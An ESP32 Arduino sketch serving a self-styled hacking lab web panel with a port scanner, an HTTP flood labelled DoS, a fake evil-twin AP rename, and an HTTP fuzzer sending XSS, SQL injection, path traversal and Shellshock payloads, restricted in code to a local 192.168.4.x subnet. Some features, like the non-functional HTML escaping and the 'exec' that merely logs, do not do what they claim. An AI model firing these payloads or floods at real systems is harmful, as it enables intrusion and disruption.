#include <WiFi.h>
#include <WebServer.h>
#include <WiFiClient.h>
#include <FS.h>
#include <SPIFFS.h>

// === KONFIGURASI ===
#define AP_SSID "Redzskid_Lab"
#define AP_PASS "HackThePlanet!"
#define LED_PIN 2
#define SCRIPT_FILE "/scripts.txt"

// === GLOBAL ===
WebServer server(80);
String currentFakeSSID = "";
bool evilTwinActive = false;
String logBuffer = "";

// === FUNGSI BANTUAN ===
void addLog(String msg) {
  logBuffer = "> " + msg + "\n" + logBuffer;
  if (logBuffer.length() > 1000) logBuffer = logBuffer.substring(0, 1000);
}

void initSpiffs() {
  if (!SPIFFS.begin(true)) {
    Serial.println("❌ SPIFFS Mount Failed");
    return;
  }
  Serial.println("✅ SPIFFS Ready");
}

void saveScript(String script) {
  File file = SPIFFS.open(SCRIPT_FILE, "a");
  if (!file) {
    Serial.println("❌ Gagal buka file");
    return;
  }
  file.println(script);
  file.close();
  addLog("Script saved: " + script);
}

String loadScripts() {
  if (!SPIFFS.exists(SCRIPT_FILE)) return "<i>Belum ada script.</i>";
  
  File file = SPIFFS.open(SCRIPT_FILE, "r");
  String content = "";
  while (file.available()) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      line.replace("<", "<");
      line.replace(">", ">");
      content = "<div style='padding:4px;border-bottom:1px solid #00331a;'>• " + line + "</div>" + content;
    }
  }
  file.close();
  return content == "" ? "<i>Belum ada script.</i>" : content;
}

// === HTML UI PROFESIONAL ===
const char MAIN_PAGE[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <title>💀 BITCHES ON YOU v4.0</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #0a0a0a, #000);
      color: #00ff9d;
      font-family: 'Courier New', monospace;
      padding: 10px;
      min-height: 100vh;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      border: 2px solid #00ff9d;
      border-radius: 12px;
      overflow: hidden;
      background: rgba(0, 10, 5, 0.8);
      box-shadow: 0 0 30px rgba(0, 255, 157, 0.2);
    }
    .header {
      background: linear-gradient(90deg, #002215, #003320);
      padding: 15px;
      text-align: center;
      border-bottom: 1px solid #00ff9d;
    }
    .header h1 {
      color: #ff0055;
      margin: 0;
      font-size: 1.8em;
      text-shadow: 0 0 10px #ff0055;
    }
    .section {
      padding: 15px;
      border-bottom: 1px solid #00331a;
    }
    .section:last-child {
      border-bottom: none;
    }
    .section-title {
      color: #00ffaa;
      margin-bottom: 10px;
      font-size: 1.1em;
    }
    .btn-group {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 8px;
      margin-bottom: 10px;
    }
    .btn {
      padding: 12px;
      background: #002215;
      color: #00ff9d;
      border: 1px solid #00ff9d;
      border-radius: 6px;
      cursor: pointer;
      font-family: inherit;
      font-size: 0.9em;
      transition: all 0.2s;
    }
    .btn:hover {
      background: #003320;
      transform: translateY(-2px);
      box-shadow: 0 0 15px rgba(0, 255, 157, 0.3);
    }
    .btn-red {
      background: #20000a;
      border-color: #ff0055;
      color: #ff66b2;
    }
    .btn-red:hover {
      background: #300015;
      box-shadow: 0 0 15px rgba(255, 0, 85, 0.3);
    }
    .btn-blue {
      background: #001122;
      border-color: #00aaff;
      color: #66ccff;
    }
    .btn-blue:hover {
      background: #002244;
      box-shadow: 0 0 15px rgba(0, 170, 255, 0.3);
    }
    input[type="text"] {
      width: 100%;
      padding: 12px;
      background: #00110a;
      color: #00ff9d;
      border: 1px solid #00ff9d;
      border-radius: 6px;
      font-family: inherit;
      font-size: 1em;
      margin: 8px 0;
    }
    .log-container {
      background: #000804;
      border: 1px solid #00331a;
      border-radius: 6px;
      padding: 10px;
      max-height: 200px;
      overflow-y: auto;
      font-size: 0.85em;
      line-height: 1.4;
    }
    .script-container {
      background: #000804;
      border: 1px solid #00331a;
      border-radius: 6px;
      padding: 10px;
      max-height: 150px;
      overflow-y: auto;
      margin-top: 10px;
    }
    .status-bar {
      background: #001a0f;
      padding: 8px;
      text-align: center;
      font-size: 0.9em;
      border-top: 1px solid #00331a;
    }
    .blink {
      animation: blink 1s infinite;
    }
    @keyframes blink {
      50% { opacity: 0.5; }
    }
    @media (max-width: 500px) {
      .btn-group {
        grid-template-columns: 1fr;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1 class="blink">💀 BITCHES ON YOU v4.0</h1>
      <p>BY REDZ NEG+ FOR EDUCATONAL IN4MATIKA</p>
    </div>

    <div class="section">
      <div class="section-title">💡 LED Controller</div>
      <div class="btn-group">
        <button class="btn" onclick="action('/led/on')">🟢 LED ON</button>
        <button class="btn" onclick="action('/led/off')">🔴 LED OFF</button>
      </div>
    </div>

    <div class="section">
      <div class="section-title">🌐 Target IP</div>
      <input type="text" id="target" value="192.168.4.2" placeholder="Target IP (192.168.4.x)">
    </div>

    <div class="section">
      <div class="section-title">⚔️ Network Tools</div>
      <div class="btn-group">
        <button class="btn-blue" onclick="action('/scan_area')">🌐 Scan Area</button>
        <button class="btn" onclick="portScan()">🔍 Port Scan</button>
        <button class="btn-red" onclick="dosAttack()">💥 DoS Attack</button>
        <button class="btn-blue" onclick="fuzzHttp()">🧨 HTTP Fuzzer</button>
      </div>
    </div>

    <div class="section">
      <div class="section-title">📡 Evil Twin Tools</div>
      <div class="btn-group">
        <button class="btn-red" onclick="evilTwinPrompt()">📡 Create Evil Twin</button>
        <button class="btn-red" onclick="deauth()">☠️ Deauth Client</button>
      </div>
    </div>

    <div class="section">
      <div class="section-title">📤 Script Executor</div>
      <input type="text" id="script" placeholder="Command / Payload">
      <button class="btn" onclick="uploadScript()">📤 Execute & Save</button>
      <div class="script-container" id="scriptList">Loading scripts...</div>
    </div>

    <div class="section">
      <div class="section-title">📋 Activity Log</div>
      <div class="log-container" id="log">Ready. All attacks LOCAL ONLY.</div>
    </div>

    <div class="status-bar" id="status">Status: Online</div>
  </div>

  <script>
    function log(msg) {
      const logDiv = document.getElementById('log');
      logDiv.innerHTML += '<br>' + msg;
      logDiv.scrollTop = logDiv.scrollHeight;
    }
    
    function status(msg) {
      document.getElementById('status').innerText = 'Status: ' + msg;
    }
    
    function action(url) {
      status('Processing...');
      fetch(url)
        .then(r => r.text())
        .then(text => {
          log('> ' + text);
          status('Ready');
        })
        .catch(e => {
          log('> ❌ Error: ' + e);
          status('Error');
        });
    }
    
    function portScan() {
      const ip = document.getElementById('target').value || '192.168.4.1';
      if(!ip.startsWith('192.168.4.')) {
        log('> ❌ Target must be 192.168.4.x');
        return;
      }
      action('/port_scan?ip=' + ip);
    }
    
    function dosAttack() {
      const ip = document.getElementById('target').value || '192.168.4.1';
      if(!ip.startsWith('192.168.4.')) {
        log('> ❌ Target must be 192.168.4.x');
        return;
      }
      if(confirm('Launch DoS to ' + ip + '?')) {
        action('/dos?ip=' + ip);
      }
    }
    
    function fuzzHttp() {
      const ip = document.getElementById('target').value || '192.168.4.1';
      if(!ip.startsWith('192.168.4.')) {
        log('> ❌ Target must be 192.168.4.x');
        return;
      }
      action('/fuzz?ip=' + ip);
    }
    
    function evilTwinPrompt() {
      const ssid = prompt("Fake SSID:", "Free_WiFi");
      if(ssid) {
        action('/evil_twin?ssid=' + encodeURIComponent(ssid));
      }
    }
    
    function deauth() {
      if(confirm('Deauth client from Evil Twin?')) {
        action('/deauth');
      }
    }
    
    function uploadScript() {
      const script = document.getElementById('script').value.trim();
      if(!script) return;
      action('/exec?cmd=' + encodeURIComponent(script));
      document.getElementById('script').value = '';
      loadScripts();
    }
    
    function loadScripts() {
      fetch('/scripts')
        .then(r => r.text())
        .then(html => {
          document.getElementById('scriptList').innerHTML = html;
        });
    }
    
    // Load scripts on start
    loadScripts();
    
    // Auto-scroll log
    setInterval(() => {
      const logDiv = document.getElementById('log');
      logDiv.scrollTop = logDiv.scrollHeight;
    }, 1000);
  </script>
</body>
</html>
)rawliteral";

// === HANDLER NYATA ===
void handleRoot() { server.send_P(200, "text/html", MAIN_PAGE); }

void handleLedOn() {
  digitalWrite(LED_PIN, HIGH);
  addLog("LED ON");
  server.send(200, "text/plain", "✅ LED NYALA! (GPIO2)");
}

void handleLedOff() {
  digitalWrite(LED_PIN, LOW);
  addLog("LED OFF");
  server.send(200, "text/plain", "🔴 LED MATI! (GPIO2)");
}

void handleScanArea() {
  String result = "🌐 Active Devices in 192.168.4.x:\n";
  int activeCount = 0;
  
  for (int i = 1; i <= 10; i++) {
    String ip = "192.168.4." + String(i);
    WiFiClient client;
    if (client.connect(ip.c_str(), 80)) {
      result += "✅ " + ip + " (Port 80)\n";
      client.stop();
      activeCount++;
    } else if (client.connect(ip.c_str(), 8080)) {
      result += "✅ " + ip + " (Port 8080)\n";
      client.stop();
      activeCount++;
    }
    delay(50);
  }
  
  if (activeCount == 0) result = "❌ No active devices found in 192.168.4.1-10";
  addLog("Scan Area: " + String(activeCount) + " devices found");
  server.send(200, "text/plain", result);
}

void handlePortScan() {
  String ip = server.arg("ip");
  if (!ip.startsWith("192.168.4.")) {
    server.send(400, "text/plain", "❌ Target must be 192.168.4.x");
    return;
  }
  
  String result = "🔍 Scanning " + ip + ":\n";
  int ports[] = {80, 8080, 22, 21, 23, 8000, 3000, 5000};
  int openPorts = 0;
  
  for (int i = 0; i < 8; i++) {
    WiFiClient client;
    if (client.connect(ip.c_str(), ports[i])) {
      result += "✅ Port " + String(ports[i]) + ": OPEN\n";
      client.stop();
      openPorts++;
    } else {
      result += "❌ Port " + String(ports[i]) + ": CLOSED\n";
    }
    delay(50);
  }
  
  addLog("Port Scan: " + String(openPorts) + " open ports on " + ip);
  server.send(200, "text/plain", result);
}

void handleDoS() {
  String ip = server.arg("ip");
  if (!ip.startsWith("192.168.4.")) {
    server.send(400, "text/plain", "❌ Target must be 192.168.4.x");
    return;
  }
  
  int sent = 0;
  for (int i = 0; i < 100; i++) {
    WiFiClient client;
    if (client.connect(ip.c_str(), 80)) {
      client.print("GET / HTTP/1.1\r\nHost: " + ip + "\r\nConnection: close\r\n\r\n");
      client.stop();
      sent++;
    }
    delay(5);
  }
  
  addLog("DoS Attack: " + String(sent) + " packets to " + ip);
  server.send(200, "text/plain", "💥 DoS complete!\nSent: " + String(sent) + "/100 packets to " + ip);
}

void handleFuzz() {
  String ip = server.arg("ip");
  if (!ip.startsWith("192.168.4.")) {
    server.send(400, "text/plain", "❌ Target must be 192.168.4.x");
    return;
  }
  
  String payloads[] = {"'", "\"", "<script>alert(1)</script>", "../../../../etc/passwd", "1' OR '1'='1", "<img src=x onerror=alert(1)>", "() { :; }; /bin/bash -c 'echo test'"};
  String result = "🧨 Fuzzing http://" + ip + "/?id=FUZZ\n";
  
  for (int i = 0; i < 7; i++) {
    WiFiClient client;
    if (client.connect(ip.c_str(), 80)) {
      String req = "GET /?id=" + payloads[i] + " HTTP/1.1\r\nHost: " + ip + "\r\n\r\n";
      client.print(req);
      client.stop();
      result += "Sent: " + payloads[i] + "\n";
    }
    delay(100);
  }
  
  addLog("HTTP Fuzz: 7 payloads sent to " + ip);
  server.send(200, "text/plain", result);
}

void handleEvilTwin() {
  String ssid = server.arg("ssid");
  if (ssid == "") ssid = "Free_WiFi";
  
  WiFi.softAPdisconnect(true);
  delay(500);
  WiFi.softAP(ssid.c_str(), "12345678");
  
  currentFakeSSID = ssid;
  evilTwinActive = true;
  addLog("Evil Twin: " + ssid + " created");
  server.send(200, "text/plain", "📡 Evil Twin LIVE!\nSSID: " + ssid + "\nPassword: 12345678\n⚠️ LOCAL TESTING ONLY");
}

void handleDeauth() {
  if (!evilTwinActive) {
    server.send(200, "text/plain", "❌ Evil Twin not active!");
    return;
  }
  
  WiFi.softAPdisconnect(true);
  delay(1000);
  WiFi.softAP(currentFakeSSID.c_str(), "12345678");
  addLog("Deauth: Client disconnected from " + currentFakeSSID);
  server.send(200, "text/plain", "☠️ Client deauthenticated!\n(AP restarted)");
}

void handleExec() {
  String cmd = server.arg("cmd");
  saveScript(cmd);
  
  if (cmd == "reboot") {
    addLog("Reboot command executed");
    server.send(200, "text/plain", "🔄 Rebooting...");
    delay(1000);
    ESP.restart();
  } else if (cmd.startsWith("led ")) {
    if (cmd == "led on") {
      digitalWrite(LED_PIN, HIGH);
      addLog("LED forced ON");
      server.send(200, "text/plain", "✅ LED forced ON");
    } else if (cmd == "led off") {
      digitalWrite(LED_PIN, LOW);
      addLog("LED forced OFF");
      server.send(200, "text/plain", "✅ LED forced OFF");
    } else {
      server.send(200, "text/plain", "❓ Unknown LED command");
    }
  } else {
    addLog("Executed: " + cmd);
    server.send(200, "text/plain", "📤 Executed: " + cmd);
  }
}

void handleScripts() {
  String html = loadScripts();
  server.send(200, "text/html", html);
}

// === SETUP ===
void setup() {
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  Serial.begin(115200);
  
  initSpiffs();
  
  WiFi.softAP(AP_SSID, AP_PASS);
  Serial.println("\n💀 bitch lasagna v4.0 ACTIVE");
  Serial.println("SSID: " + String(AP_SSID));
  Serial.println("Password: " + String(AP_PASS));
  Serial.println("IP: 192.168.4.1");
  Serial.println("⚠️ LEGAL USAGE ONLY");

  server.on("/", handleRoot);
  server.on("/led/on", handleLedOn);
  server.on("/led/off", handleLedOff);
  server.on("/scan_area", handleScanArea);
  server.on("/port_scan", handlePortScan);
  server.on("/dos", handleDoS);
  server.on("/fuzz", handleFuzz);
  server.on("/evil_twin", handleEvilTwin);
  server.on("/deauth", handleDeauth);
  server.on("/exec", handleExec);
  server.on("/scripts", handleScripts);

  server.begin();
  addLog("System initialized");
}

void loop() {
  server.handleClient();
}
